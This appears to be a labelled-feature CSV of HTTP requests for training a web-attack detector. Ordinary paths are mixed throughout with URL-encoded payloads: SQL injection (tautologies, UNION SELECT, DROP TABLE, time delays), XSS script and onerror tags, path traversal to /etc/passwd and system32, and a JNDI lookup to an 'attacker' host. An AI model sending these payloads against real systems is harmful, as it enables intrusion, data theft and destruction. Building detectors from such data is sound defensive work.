method,path,body,single_q,double_q,dashes,braces,spaces,badwords
POST,/weather/today,product=123&type=info,0,0,0,0,0,0
GET,/projects,,0,0,0,0,0,0
GET,/forum/threads?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
GET,/products.html?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
POST,/dashboard/overview?q=sleep%285%29,data=sleep%285%29,0,0,0,2,0,4
GET,/docs/tutorials,,0,0,0,0,0,0
POST,/restaurants/nearby,id=55,0,0,0,0,0,0
GET,/settings/billing,,0,0,0,0,0,0
POST,/admin/dashboard,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/products.html,comment=Nice+product,0,0,0,0,1,0
GET,/user/profile?id=3?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,0,0,0,1,0,3
POST,/stocks,comment=Nice+product,0,0,0,0,1,0
POST,/subscribe,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/forum/post?id=2?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
POST,/inbox/read?id=7,comment=Nice+product,0,0,0,0,1,0
GET,/forum/post?id=3,,0,0,0,0,0,0
GET,/newsfeed/today,,0,0,0,0,0,0
GET,/auth/reset-password?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
GET,/locations/europe,,0,0,0,0,0,0
GET,/downloads/app,,0,0,0,0,0,0
POST,/stocks/market,comment=Nice+product,0,0,0,0,1,0
GET,/subscribe,,0,0,0,0,0,0
GET,/support/chat,,0,0,0,0,0,0
POST,/dashboard/overview,uname=test&pass=test,0,0,0,0,0,0
POST,/organization/about,uname=test&pass=test,0,0,0,0,0,0
POST,/projects/view?id=8,product=123&type=info,0,0,0,0,0,0
POST,/settings/profile,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/user/orders?q=%253Cscript%253Ealert%28%29,,0,0,0,1,0,2
POST,/organization/about,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/careers/job?id=25?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/category/fashion,,0,0,0,0,0,0
GET,/terms-and-conditions,,0,0,0,0,0,0
GET,/blog/category/security,,0,0,0,0,0,0
GET,/news/world,,0,0,0,0,0,0
POST,/weather/city?name=Delhi,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/docs?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,data=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,0,0,0,0,0,2
POST,/offers?q=%27%3B+DROP+TABLE+users%3B+--,data=%27%3B+DROP+TABLE+users%3B+--,2,0,2,0,8,4
POST,/settings/billing,id=55,0,0,0,0,0,0
POST,/category/sports,product=123&type=info,0,0,0,0,0,0
GET,/static/app.js?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/stocks/market,,0,0,0,0,0,0
POST,/feedback/submit,uname=test&pass=test,0,0,0,0,0,0
GET,/page/1?q=%27+UNION+SELECT+1%2C2%2C3+--,,1,0,1,0,4,4
POST,/restaurants,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/settings/preferences?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
GET,/store/laptops,,0,0,0,0,0,0
GET,/user/cart,,0,0,0,0,0,0
POST,/page/4,uname=test&pass=test,0,0,0,0,0,0
GET,/auth/verify-email?q=sleep%285%29,,0,0,0,1,0,2
GET,/user/wishlist,,0,0,0,0,0,0
POST,/category/sports,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/crypto/market,,0,0,0,0,0,0
POST,/newsfeed,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/library,,0,0,0,0,0,0
POST,/downloads/manual,product=123&type=info,0,0,0,0,0,0
POST,/locations/india?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
GET,/news/trending?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/contact.html?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
GET,/analytics/traffic,,0,0,0,0,0,0
POST,/university?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,data=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,0,0,0,0,0,0
POST,/page/4,uname=test&pass=test,0,0,0,0,0,0
GET,/movies/details?id=9,,0,0,0,0,0,0
GET,/books/read?id=100,,0,0,0,0,0,0
GET,/news/local,,0,0,0,0,0,0
GET,/travel/hotels,,0,0,0,0,0,0
GET,/notifications?q=1%3B+DROP+TABLE+users%3B,,0,0,0,0,3,2
GET,/projects/view?id=8,,0,0,0,0,0,0
GET,/forum/post?id=2?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/newsfeed,,0,0,0,0,0,0
GET,/api/v2/register,,0,0,0,0,0,0
POST,/forum/post?id=1,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/inbox/messages,,0,0,0,0,0,0
GET,/api/v1/orders?q=%253Cscript%253Ealert%28%29,,0,0,0,1,0,2
POST,/admin?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
GET,/forum/category/general,,0,0,0,0,0,0
GET,/projects/view?id=8,,0,0,0,0,0,0
POST,/orders/detail?id=100?q=%27%3B+DROP+TABLE+users%3B+--,data=%27%3B+DROP+TABLE+users%3B+--,2,0,2,0,8,4
GET,/blog/category/security?q=1%3B+DROP+TABLE+users%3B,,0,0,0,0,3,2
POST,/blog/post3,id=55,0,0,0,0,0,0
GET,/products/list?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
POST,/restaurants/view?id=23?q=sleep%285%29,data=sleep%285%29,0,0,0,2,0,4
GET,/admin/reports?q=%27%3B+DROP+TABLE+users%3B+--,,1,0,1,0,4,2
GET,/store,,0,0,0,0,0,0
POST,/auth/reset-password,uemail=test@example.com,0,0,0,0,0,0
GET,/user/settings,,0,0,0,0,0,0
POST,/api/v2/register?q=%253Cscript%253Ealert%28%29,data=%253Cscript%253Ealert%28%29,0,0,0,2,0,4
GET,/blog/post2,,0,0,0,0,0,0
POST,/search?page=1,,0,0,0,0,0,0
POST,/products/trending,product=123&type=info,0,0,0,0,0,0
POST,/checkout,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/projects/list,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/feedback/form,,0,0,0,0,0,0
POST,/events/past,product=123&type=info,0,0,0,0,0,0
POST,/products,uemail=test@example.com,0,0,0,0,0,0
POST,/promo/winter?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
POST,/products?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
POST,/events/upcoming,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/api/v1/categories?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,data=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,6,0,2,0,8,4
POST,/assets/images/banner.jpg,id=55,0,0,0,0,0,0
POST,/events/past,product=123&type=info,0,0,0,0,0,0
GET,/promo/winter,,0,0,0,0,0,0
POST,/travel/offers,uemail=test@example.com,0,0,0,0,0,0
POST,/products/top,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/projects/list,,0,0,0,0,0,0
POST,/sports/football,uname=test&pass=test,0,0,0,0,0,0
GET,/newsfeed?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
GET,/products/filter?price=low,,0,0,0,0,0,0
GET,/user/messages,,0,0,0,0,0,0
GET,/user/notifications,,0,0,0,0,0,0
POST,/page/2,,0,0,0,0,0,0
POST,/products/view?id=2,,0,0,0,0,0,0
POST,/weather/city?name=Delhi?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,data=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,0,0,0,0,0,2
GET,/store/checkout?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/checkout,,0,0,0,0,0,0
GET,/news?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,,3,0,1,0,4,2
POST,/auth/reset-password,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/category/electronics,,0,0,0,0,0,0
POST,/category/home-appliances,id=55,0,0,0,0,0,0
GET,/assets/css/main.css?q=sleep%285%29,,0,0,0,1,0,2
POST,/news/latest,comment=Nice+product,0,0,0,0,1,0
POST,/subscriptions,uname=test&pass=test,0,0,0,0,0,1
GET,/movies/details?id=9?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
POST,/shop/categories,uemail=test@example.com,0,0,0,0,0,0
GET,/category/sports,,0,0,0,0,0,0
POST,/user/cart/add?id=45,product=123&type=info,0,0,0,0,0,0
POST,/events?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
POST,/account/downloads,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/crypto/market?q=%22+AND+1%3D1+--,,0,1,1,0,3,1
GET,/languages/hindi,,0,0,0,0,0,0
GET,/shop/item?id=89,,0,0,0,0,0,0
GET,/tickets/view?id=44,,0,0,0,0,0,0
POST,/category/sports,uname=test&pass=test,0,0,0,0,0,0
POST,/restaurants?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
GET,/billing/history,,0,0,0,0,0,0
POST,/user/profile?id=1,comment=Nice+product,0,0,0,0,1,0
GET,/weather/today,,0,0,0,0,0,0
GET,/notifications/settings,,0,0,0,0,0,0
GET,/static/style.css,,0,0,0,0,0,0
GET,/events/upcoming,,0,0,0,0,0,0
GET,/music/playlist?id=4,,0,0,0,0,0,0
POST,/dashboard,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/events,,0,0,0,0,0,0
GET,/blog/post2,,0,0,0,0,0,0
POST,/docs,product=123&type=info,0,0,0,0,0,0
GET,/blog/post1,,0,0,0,0,0,0
GET,/travel/offers,,0,0,0,0,0,0
POST,/about.html?q=%27+OR+sleep%285%29%23,data=%27+OR+sleep%285%29%23,2,0,0,2,4,4
POST,/news/world?q=sleep%285%29,data=sleep%285%29,0,0,0,2,0,4
GET,/subscribe,,0,0,0,0,0,0
GET,/gallery,,0,0,0,0,0,0
GET,/languages,,0,0,0,0,0,0
POST,/api/v1/items,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/news/trending?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,,3,0,1,0,4,2
GET,/analytics/sales?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
GET,/help/how-to-order,,0,0,0,0,0,0
GET,/stocks/company?id=TCS?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
GET,/billing/history?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,,2,0,0,1,0,3
GET,/faq,,0,0,0,0,0,0
POST,/store/cameras,uname=test&pass=test,0,0,0,0,0,0
POST,/settings/billing,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/admin/logs?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
POST,/analytics,comment=Nice+product,0,0,0,0,1,0
POST,/weather/week,comment=Nice+product,0,0,0,0,1,0
POST,/careers,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/admin/logs,,0,0,0,0,0,0
GET,/api/v1/categories?q=%22+AND+1%3D1+--,,0,1,1,0,3,1
POST,/store/cart,uemail=test@example.com,0,0,0,0,0,0
GET,/feedback/form,,0,0,0,0,0,0
POST,/api/v1/users/2,uname=test&pass=test,0,0,0,0,0,0
GET,/auth/login,,0,0,0,0,0,0
POST,/languages?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
POST,/api/v1/items,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/api/v1/orders?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
POST,/auth/register,,0,0,0,0,0,0
GET,/forum/post?id=3,,0,0,0,0,0,0
POST,/university,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/contact.php,,0,0,0,0,0,0
POST,/partners/login,id=55,0,0,0,0,0,0
GET,/search?q=shoes,,0,0,0,0,0,0
GET,/organization/about,,0,0,0,0,0,0
GET,/partners/login,,0,0,0,0,0,0
GET,/analytics,,0,0,0,0,0,0
POST,/blog/category/tech?q=sleep%285%29,data=sleep%285%29,0,0,0,2,0,4
POST,/news/latest,id=55,0,0,0,0,0,0
POST,/auth/login,comment=Nice+product,0,0,0,0,1,0
POST,/orders/detail?id=100,uemail=test@example.com,0,0,0,0,0,0
POST,/api/v3/settings,comment=Nice+product,0,0,0,0,1,0
GET,/search?q=laptops,,0,0,0,0,0,0
GET,/store/cameras,,0,0,0,0,0,0
GET,/search?cat=fashion,,0,0,0,0,0,0
GET,/downloads/manual,,0,0,0,0,0,0
GET,/library,,0,0,0,0,0,0
POST,/notifications,product=123&type=info,0,0,0,0,0,0
POST,/weather/today,product=123&type=info,0,0,0,0,0,0
GET,/assets/css/main.css?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,0,0,0,1,0,3
POST,/products.html,comment=Nice+product,0,0,0,0,1,0
GET,/dashboard/stats,,0,0,0,0,0,0
GET,/offers/clearance?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
POST,/admin/logs,uemail=test@example.com,0,0,0,0,0,0
GET,/auth/reset-password?q=%27+AND+1%3D1+--,,1,0,1,0,3,1
POST,/page/4,product=123&type=info,0,0,0,0,0,0
POST,/events/past,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/news/local,,0,0,0,0,0,0
GET,/news/local,,0,0,0,0,0,0
POST,/books,product=123&type=info,0,0,0,0,0,0
POST,/travel/hotels,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/news/local,id=55,0,0,0,0,0,0
GET,/terms-and-conditions,,0,0,0,0,0,0
GET,/settings/security?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
POST,/admin/reports,product=123&type=info,0,0,0,0,0,0
POST,/orders/list?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
GET,/billing/payment-methods,,0,0,0,0,0,0
GET,/search?page=2,,0,0,0,0,0,0
POST,/restaurants/view?id=23,uname=test&pass=test,0,0,0,0,0,0
POST,/restaurants,comment=Nice+product,0,0,0,0,1,0
POST,/terms-and-conditions,product=123&type=info,0,0,0,0,0,0
GET,/user/wishlist,,0,0,0,0,0,0
GET,/billing,,0,0,0,0,0,0
POST,/admin/settings?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
GET,/settings/profile?q=%253Cscript%253Ealert%28%29,,0,0,0,1,0,2
GET,/category/electronics,,0,0,0,0,0,0
POST,/locations/usa?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
GET,/settings/billing,,0,0,0,0,0,0
POST,/account/downloads,,0,0,0,0,0,0
POST,/orders?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
POST,/university/course?id=20,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/settings?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
GET,/notifications/settings,,0,0,0,0,0,0
POST,/products.html,id=55,0,0,0,0,0,0
POST,/gallery/photos,id=55,0,0,0,0,0,0
GET,/search?page=3,,0,0,0,0,0,0
GET,/settings/security?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
GET,/account,,0,0,0,0,0,0
GET,/promo/summer,,0,0,0,0,0,0
POST,/page/3?q=%22+AND+1%3D1+--,data=%22+AND+1%3D1+--,0,2,2,0,6,2
POST,/search?page=3?q=%27+AND+1%3D1+--,data=%27+AND+1%3D1+--,2,0,2,0,6,2
POST,/library/books,id=55,0,0,0,0,0,0
POST,/weather/city?name=Delhi,,0,0,0,0,0,0
GET,/page/3,,0,0,0,0,0,0
POST,/products/filter?cat=men?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
POST,/api/v3/notifications,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/library/books?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
GET,/products,,0,0,0,0,0,0
GET,/services.php?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,,2,0,0,1,0,3
GET,/crypto/market,,0,0,0,0,0,0
POST,/user/settings,uname=test&pass=test,0,0,0,0,0,0
POST,/assets/images/banner.jpg?q=%22+AND+1%3D1+--,data=%22+AND+1%3D1+--,0,2,2,0,6,2
POST,/billing/invoice?id=55,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/settings/preferences?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
GET,/search?page=3,,0,0,0,0,0,0
POST,/support,product=123&type=info,0,0,0,0,0,0
GET,/shop/item?id=89?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,,3,0,1,0,4,2
GET,/appointments,,0,0,0,0,0,0
POST,/news,id=55,0,0,0,0,0,0
POST,/checkout/payment?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,4,0,0,2,0,6
GET,/offers/clearance,,0,0,0,0,0,0
POST,/auth/reset-password?q=%27%3B+DROP+TABLE+users%3B+--,data=%27%3B+DROP+TABLE+users%3B+--,2,0,2,0,8,4
GET,/checkout/address,,0,0,0,0,0,0
GET,/travel/flights?q=%253Cscript%253Ealert%28%29,,0,0,0,1,0,2
POST,/admin/reports?q=%27%3B+DROP+TABLE+users%3B+--,data=%27%3B+DROP+TABLE+users%3B+--,2,0,2,0,8,4
POST,/projects/view?id=8?q=1%3B+DROP+TABLE+users%3B,data=1%3B+DROP+TABLE+users%3B,0,0,0,0,6,4
POST,/api/v1/users/2,product=123&type=info,0,0,0,0,0,0
GET,/tickets/open,,0,0,0,0,0,0
GET,/user/notifications,,0,0,0,0,0,0
GET,/billing/invoice?id=55,,0,0,0,0,0,0
GET,/sports/football,,0,0,0,0,0,0
GET,/university,,0,0,0,0,0,0
POST,/restaurants,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/music/playlist?id=4,id=55,0,0,0,0,0,0
GET,/locations/usa?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
POST,/account/history,comment=Nice+product,0,0,0,0,1,0
POST,/movies/details?id=9,,0,0,0,0,0,0
POST,/reviews,uemail=test@example.com,0,0,0,0,0,0
GET,/terms-and-conditions?q=%27+AND+1%3D1+--,,1,0,1,0,3,1
GET,/contact.php?q=%253Cscript%253Ealert%28%29,,0,0,0,1,0,2
POST,/pricing.html,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/products/top,,0,0,0,0,0,0
POST,/shop/item?id=89,uname=test&pass=test,0,0,0,0,0,0
POST,/careers/job?id=25?q=%253Cscript%253Ealert%28%29,data=%253Cscript%253Ealert%28%29,0,0,0,2,0,4
POST,/search?page=3,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/reviews,,0,0,0,0,0,0
POST,/products/reviews?id=10,product=123&type=info,0,0,0,0,0,0
POST,/dashboard,comment=Nice+product,0,0,0,0,1,0
GET,/unsubscribe?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
GET,/gallery/videos?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/analytics,,0,0,0,0,0,0
POST,/downloads/manual?q=%27%3B+DROP+TABLE+users%3B+--,data=%27%3B+DROP+TABLE+users%3B+--,2,0,2,0,8,4
GET,/products.html?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,,0,0,0,0,0,1
POST,/blog/category/lifestyle?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
POST,/terms-and-conditions,id=55,0,0,0,0,0,0
POST,/api/v2/register?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
POST,/pricing.html,uname=test&pass=test,0,0,0,0,0,0
GET,/feedback/submit,,0,0,0,0,0,0
POST,/events,,0,0,0,0,0,0
POST,/blog/post1,id=55,0,0,0,0,0,0
GET,/auth/register,,0,0,0,0,0,0
GET,/api/v1/users?q=%27+UNION+SELECT+1%2C2%2C3+--,,1,0,1,0,4,4
GET,/tickets/view?id=44,,0,0,0,0,0,0
GET,/page/3,,0,0,0,0,0,0
POST,/forum/post?id=3,id=55,0,0,0,0,0,0
GET,/search?q=shoes,,0,0,0,0,0,0
GET,/products/filter?cat=women,,0,0,0,0,0,0
POST,/shop/categories,comment=Nice+product,0,0,0,0,1,0
POST,/university/course?id=20?q=benchmark%281000000%2Cmd5%281%29%29,data=benchmark%281000000%2Cmd5%281%29%29,0,0,0,4,0,2
POST,/blog/category/tech?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
POST,/partners/apply,uname=test&pass=test,0,0,0,0,0,0
GET,/store/checkout,,0,0,0,0,0,0
POST,/news?q=%27%3B+DROP+TABLE+users%3B+--,data=%27%3B+DROP+TABLE+users%3B+--,2,0,2,0,8,4
GET,/stocks/company?id=TCS,,0,0,0,0,0,0
POST,/crypto/coin?id=ETH,uname=test&pass=test,0,0,0,0,0,0
GET,/blog,,0,0,0,0,0,0
GET,/sports/cricket,,0,0,0,0,0,0
GET,/api/v1/users/2,,0,0,0,0,0,0
GET,/shop/item?id=89,,0,0,0,0,0,0
GET,/account/info,,0,0,0,0,0,0
POST,/products/view?id=1,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/help,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/assets/css/main.css,,0,0,0,0,0,0
GET,/news/latest,,0,0,0,0,0,0
GET,/help/faq?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/downloads/app,,0,0,0,0,0,0
POST,/admin/users?q=benchmark%281000000%2Cmd5%281%29%29,data=benchmark%281000000%2Cmd5%281%29%29,0,0,0,4,0,2
GET,/travel/flights,,0,0,0,0,0,0
POST,/user/settings,uemail=test@example.com,0,0,0,0,0,0
GET,/downloads/app,,0,0,0,0,0,0
GET,/careers/job?id=25,,0,0,0,0,0,0
POST,/blog/category/lifestyle?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
GET,/news/local,,0,0,0,0,0,0
POST,/search?page=1,uemail=test@example.com,0,0,0,0,0,0
GET,/account/info,,0,0,0,0,0,0
GET,/store/checkout?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/news/business?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,0,0,0,1,0,3
GET,/forum/post?id=3,,0,0,0,0,0,0
POST,/api/v1/items,product=123&type=info,0,0,0,0,0,0
POST,/forum/post?id=3?q=%27+OR+sleep%285%29%23,data=%27+OR+sleep%285%29%23,2,0,0,2,4,4
GET,/blog/post1,,0,0,0,0,0,0
GET,/orders?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/store/laptops,,0,0,0,0,0,0
POST,/careers/jobs,product=123&type=info,0,0,0,0,0,0
GET,/account/info?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
GET,/,,0,0,0,0,0,0
GET,/tickets/open,,0,0,0,0,0,0
POST,/settings/preferences,uemail=test@example.com,0,0,0,0,0,0
POST,/music,product=123&type=info,0,0,0,0,0,0
POST,/account/history,product=123&type=info,0,0,0,0,0,0
GET,/downloads/app,,0,0,0,0,0,0
GET,/events/past?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
POST,/account,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/languages/hindi,,0,0,0,0,0,0
GET,/dashboard,,0,0,0,0,0,0
GET,/privacy-policy,,0,0,0,0,0,0
POST,/shop/item?id=89?q=%27+AND+1%3D1+--,data=%27+AND+1%3D1+--,2,0,2,0,6,2
POST,/category/sports?q=1%3B+DROP+TABLE+users%3B,data=1%3B+DROP+TABLE+users%3B,0,0,0,0,6,4
POST,/page/4,id=55,0,0,0,0,0,0
POST,/gallery/photos,uname=test&pass=test,0,0,0,0,0,0
POST,/assets/images/banner.jpg?q=%22+AND+1%3D1+--,data=%22+AND+1%3D1+--,0,2,2,0,6,2
POST,/help/contact,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/search?q=laptops,comment=Nice+product,0,0,0,0,1,0
GET,/privacy-policy,,0,0,0,0,0,0
POST,/languages,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/languages/hindi,,0,0,0,0,0,0
GET,/feedback/submit?q=sleep%285%29,,0,0,0,1,0,2
GET,/inbox?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,0,0,0,1,0,3
POST,/locations/europe?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
GET,/search?q=shoes?q=admin%27+--,,1,0,1,0,1,0
GET,/api/v1/items,,0,0,0,0,0,0
GET,/docs/introduction,,0,0,0,0,0,0
POST,/search?q=shoes?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
GET,/billing/history?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,,0,0,0,0,0,1
POST,/forum/category/coding?q=admin%27+--,data=admin%27+--,2,0,2,0,2,0
GET,/downloads/manual?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,,2,0,0,1,0,3
POST,/account/info?q=admin%27+--,data=admin%27+--,2,0,2,0,2,0
GET,/sports,,0,0,0,0,0,0
GET,/products/filter?price=low?q=%27%3B+DROP+TABLE+users%3B+--,,1,0,1,0,4,2
POST,/store/apply-coupon?code=NEW50,uemail=test@example.com,0,0,0,0,0,0
GET,/api/v2/login,,0,0,0,0,0,0
POST,/admin/logs?q=%22+AND+1%3D1+--,data=%22+AND+1%3D1+--,0,2,2,0,6,2
POST,/category/home-appliances?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
GET,/checkout,,0,0,0,0,0,0
POST,/tickets,,0,0,0,0,0,0
POST,/billing/history?q=%253Cscript%253Ealert%28%29,data=%253Cscript%253Ealert%28%29,0,0,0,2,0,4
GET,/settings/billing?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/billing,uname=test&pass=test,0,0,0,0,0,0
POST,/forum/post?id=2,comment=Nice+product,0,0,0,0,1,0
POST,/books/read?id=100?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
POST,/settings/profile,searchFor=book&goButton=go,0,0,0,0,0,0
